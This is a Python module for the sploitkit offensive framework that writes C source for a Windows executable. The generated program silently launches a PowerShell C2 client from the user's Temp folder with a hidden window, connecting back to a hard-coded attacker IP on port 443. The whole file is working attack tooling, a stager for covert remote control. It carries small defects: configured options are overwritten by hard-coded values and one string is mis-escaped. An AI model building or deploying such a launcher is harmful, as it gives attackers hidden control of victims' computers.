from sploitkit import *
import os
import subprocess
from template import Procedure

class executing_payload(Module):
	""" Module used to create an exe that can execute powershell payloads.

	Author:  your name (your email)
	Version: 1.0
	"""

	#MODULE OPTIONS
	config  = Config({
        Option(
            'PAYLOAD',
            "Name of the ps1 payload.",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "my_client",
        Option(
            'LHOST',
            "Your IP address.",
            True,
            #set_callback=lambda o: o.root._set_logging(o.value),
        ): "0.0.0.0",
        Option(
            'EXE_NAME',
            "Name of the EXE.",
            True,
            #set_callback=lambda o: o.root._set_logging(o.value),
        ): "name.c",
		Option(
            'OUTPUT',
            "Path of the output folder.",
            True,
            #set_callback=lambda o: o.root._set_logging(o.value),
        ): " ",
    })

	def run(self):

		c2client = ''.join(list(self.config.get('PAYLOAD')))
		ipaddr   = ''.join(list(self.config.get('LHOST')))
		name     = ''.join(list(self.config.get('EXE_NAME')))


		c2client = "client.ps1"
		ipaddr = "10.10.1.13"
		name = 'exe'


		STARTC2 = '''
		#include <iostream>
		#include <winsock2.h>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define PSSCRIPT "%s"
		#define IPADDR "%s"
		using namespace std;

		int main(void){
		       string nombre_script = PSSCRIPT;
		       string ipaddr = IPADDR;
		       char username[UNLEN+1];
		       DWORD username_len = UNLEN+1;
		       GetUserName(username, &username_len);
		       string user(username);      
		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
		       string strCMD = "start powershell.exe -noprofile -windowstyle hidden -Command "\\&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\";
		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.

		}
		''' % (c2client, ipaddr)

		f = open(name+".c","w")
		f.write(STARTC2)
		print("File "+name+" created.")
